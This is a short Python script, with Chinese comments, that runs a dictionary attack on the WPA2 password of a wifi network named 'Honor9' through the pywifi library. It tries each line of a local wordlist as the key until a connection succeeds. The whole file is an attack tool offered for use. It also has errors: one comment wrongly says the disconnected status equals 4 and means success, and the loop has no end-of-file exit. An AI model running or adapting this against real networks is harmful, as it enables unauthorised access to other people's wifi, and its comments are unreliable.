import pywifi #导入模块
from pywifi import const  # const 是wifi设置的一些常量，如状态码成功代表4 失败代表 0等
import time

def crack(password):
    """破解wifi"""
    wifi = pywifi.PyWiFi()  # 实列化一个对象
    #  获取第一张网卡
    iface= wifi.interfaces()[0]
    #  断开网卡连接
    iface.disconnect()
    time.sleep(2)
    
    #  删除所有的wifi配置文件（有点类似于不让wifi热点记住我们的信息蕾仕于初始化）
    iface.remove_all_network_profiles()
    
    #  创建新的wifi的配置文件，文件指定了，wifi的名称 ，密码，编码方式等配置选项
    #const.IFACE_DISCONNECTED 其实等于 4，4代表连接成功
    if iface.status() == const.IFACE_DISCONNECTED: 
        profile = pywifi.Profile()
        profile.ssid = "Honor9"    #ssid是wifi的名称
        #  wifi的开放状态 （要连接的wifi必须是开放状态）
        profile.auth = const.AUTH_ALG_OPEN
        #  wifi的加密算法
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        #  wifi密码
        profile.key = password #password在这里是密码由read_password()传入

        #  添加新的wifi配置文件
        new_profile = iface.add_network_profile(profile)

        #  连接wifi
        iface.connect(new_profile)

        time.sleep(4)
        if iface.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False
    else:
        print("已连接")

def read_password():
    """读取密码"""
    print("开始破解")
    path = r"D:\我的python\Date\Pywifi\1.txt" #字典的路径
    with open(path,"r") as f:  #打开字典文件
        while True:
            try:
                password = f.readline()  #读取文件的每一行
                bool = crack(password)
                if bool:
                    print("破解成功了"+password) #如果破解成功退出程序
                    break
                else:
                    print("破解失败"+password)
            except:
                continue  

read_password()


